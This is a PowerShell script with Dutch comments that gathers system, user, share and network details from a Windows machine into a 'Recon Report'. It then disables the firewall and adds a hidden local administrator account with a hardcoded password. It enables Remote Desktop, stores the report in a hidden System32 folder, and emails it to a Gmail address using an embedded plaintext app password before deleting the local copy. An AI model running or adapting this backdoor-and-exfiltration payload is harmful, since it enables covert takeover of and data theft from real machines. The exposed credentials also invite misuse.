#Datum voor folders
     $date = get-date
     $folderDateTime = (get-date)
#Report creatie 1
     $style = "<style> table td{padding-right: 10px;text-align: left;}#body {padding:50px;font-family: Helvetica; font-size: 12pt; border: 10px solid black;background-color:white;height:100%;overflow:auto;}#left{float:left; background-color:#C0C0C0;width:45%;height:260px;border: 4px solid black;padding:10px;margin:10px;overflow:scroll;}#right{background-color:#C0C0C0;float:right;width:45%;height:260px;border: 4px solid black;padding:10px;margin:10px;overflow:scroll;}#c{background-color:#C0C0C0;width:98%;height:300px;border: 4px solid black;padding:10px;overflow:scroll;margin:10px;} </style>"
     $Report = ConvertTo-Html -Title 'Recon Report' -Head $style
     $Report = $Report +"<div id=body><h1>Recon</h1><hr size=2><br><h3> Generated on: $Date </h3><br>"
#Systeem
    #Boot informatie
             $SysBootTime = Get-WmiObject Win32_OperatingSystem 
             $BootTime = $SysBootTime.ConvertToDateTime($SysBootTime.LastBootUpTime)| ConvertTo-Html datetime 
     #Serials
             $SysSerialNo = (Get-WmiObject -Class Win32_OperatingSystem -ComputerName $env:COMPUTERNAME) 
             $SerialNo = $SysSerialNo.SerialNumber 
     #Systeem informatie
             $SysInfo = Get-WmiObject -class Win32_ComputerSystem -namespace root/CIMV2 | Select Manufacturer,Model 
             $SysManufacturer = $SysInfo.Manufacturer 
             $SysModel = $SysInfo.Model
             $OS = (Get-WmiObject Win32_OperatingSystem -computername $env:COMPUTERNAME ).caption
     #Schijf informatie   
             $disk = Get-WmiObject Win32_LogicalDisk -Filter "DeviceID='C:'"
             $HD = [math]::truncate($disk.Size / 1GB)
             $FreeSpace = [math]::truncate($disk.FreeSpace / 1GB)
         #Hardware Informatie
              #RAM
                    $SysRam = Get-WmiObject -Class Win32_OperatingSystem -computername $env:COMPUTERNAME | Select  TotalVisibleMemorySize
                    $Ram = [Math]::Round($SysRam.TotalVisibleMemorySize/1024KB)
              #CPU  
                    $SysCpu = Get-WmiObject Win32_Processor | Select Name
                    $Cpu = $SysCpu.Name
              #Harddrive Serial  
                    $HardSerial = Get-WMIObject Win32_BIOS -Computer $env:COMPUTERNAME | select SerialNumber
                    $HardSerialNo = $HardSerial.SerialNumber
              #Disk Drive
                    $SysCdDrive = Get-WmiObject Win32_CDROMDrive |select Name
              #Video kaart
                    $graphicsCard = gwmi win32_VideoController |select Name
                    $graphics = $graphicsCard.Name
              #CD Drive
                    $SysCdDrive = Get-WmiObject Win32_CDROMDrive |select -first 1
                    $DriveLetter = $CDDrive.Drive
                    $DriveName = $CDDrive.Caption
                    $Disk = $DriveLetter + '' + $DriveName
#Firewall
     $Firewall = New-Object -com HNetCfg.FwMgr 
     $FireProfile = $Firewall.LocalPolicy.CurrentProfile 
     $FireProfile = $FireProfile.FirewallEnabled
#Report creatie 2
        $Report = $Report  + "<div id=left><h3>Computer Information</h3><br><table><tr><td>Operating System</td><td>$OS</td></tr><tr><td>OS Serial Number:</td><td>$SerialNo</td></tr><tr><td>Current User:</td><td>$env:USERNAME </td></tr><tr><td>System Uptime:</td><td>$BootTime</td></tr><tr><td>System Manufacturer:</td><td>$SysManufacturer</td></tr><tr><td>System Model:</td><td>$SysModel</td></tr><tr><td>Serial Number:</td><td>$HardSerialNo</td></tr><tr><td>Firewall is Active:</td><td>$FireProfile</td></tr></table></div><div id=right><h3>Hardware Information</h3><table><tr><td>Hardrive Size:</td><td>$HD GB</td></tr><tr><td>Hardrive Free Space:</td><td>$FreeSpace GB</td></tr><tr><td>System RAM:</td><td>$Ram GB</td></tr><tr><td>Processor:</td><td>$Cpu</td></tr><td>CD Drive:</td><td>$Disk</td></tr><tr><td>Graphics Card:</td><td>$graphics</td></tr></table></div>"
  #User informatie
        $UserInfo = Get-WmiObject -class Win32_UserAccount -namespace root/CIMV2 | Where-Object {$_.Name -eq $env:UserName}| Select AccountType,SID,PasswordRequired 
        $UserType = $UserInfo.AccountType
        $UserSid = $UserInfo.SID
        $UserPass = $UserInfo.PasswordRequired
        $IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')
 #Rapport creatie 3
         $Report =  $Report +"<div id=left><h3>User Information</h3><br><table><tr><td>Current User Name:</td><td>$env:USERNAME</td></tr><tr><td>Account Type:</td><td> $UserType</td></tr><tr><td>User SID:</td><td>$UserSid</td></tr><tr><td>Account Domain:</td><td>$env:USERDOMAIN</td></tr><tr><td>Password Required:</td><td>$UserPass</td></tr><tr><td>Current User is Admin:</td><td>$IsAdmin</td></tr></table>" 
         $Report = $Report + '</div>'
         $Report =  $Report + '<div id=left><h3>Shared Drives/Devices</h3>'
         $Report =  $Report + (GET-WMIOBJECT Win32_Share | convertto-html Name, Description, Path)
         $Report = $Report + '</div>'
         $Report =  $Report + '<div id=c><h3>Network Information</h3>'
         $Report =  $Report + (Get-WmiObject Win32_NetworkAdapterConfiguration -filter 'IPEnabled= True' | Select Description,DNSHostname, @{Name='IP Address ';Expression={$_.IPAddress}}, MACAddress | ConvertTo-Html)
         $Report = $Report + '</table></div>'
		 
#User aanmaken - Hidden in userslist
     netsh advfirewall set allprofiles state off 
     Net User testuser Voordeur1 /ADD
     Net LocalGroup Administrators testuser /ADD 
     reg add 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon\SpecialAccounts\UserList' /v testuser /t REG_DWORD /d 0 /f

#RDP aanzetten
    Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server' -Name fDenyTSConnections -Value 0
    Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name UserAuthentication -Value 1
    netsh advfirewall firewall set rule group='remote desktop - remotefx' new enable=Yes
    netsh advfirewall firewall set rule group='remote desktop' new enable=Yes
    REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
    REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f
    
 #Ip map aanmaken + Testen of de map al bestaat
 If(!(Test-Path -Path C:\windows\System32\WinDat)){
       new-item C:\windows\System32\WinDat -itemtype directory | %{$_.Attributes = "hidden"}
    }

        #Rapport Finish
             $Report >> "C:\windows\System32\WinDat\ComputerInfo.html"
	     
	     $PSEmailServer = "smtp.gmail.com"
$credentials = New-object Management.Automation.PSCredential "gcdemogithub@gmail.com", ("rajtvpjyrxeygatt" | ConvertTo-SecureString -AsPlainText -Force)
$enc  = New-Object System.Text.utf8encoding
$from = "gcdemogithub@gmail.com"
$to = "gcdemogithub@gmail.com"
$body = [System.IO.File]::ReadAllText("C:\windows\System32\WinDat\Computerinfo.html")
$subject = "PC Info"
Send-MailMessage -Port 587 -From $from -BodyAsHtml -Encoding $enc -To $to -Subject $subject -Body $body -UseSsl -Credential $credentials
         #Delete lokaal rapport
	 Start-Sleep -Seconds 5
             Remove-Item C:\windows\System32\WinDat\Computerinfo.html -force
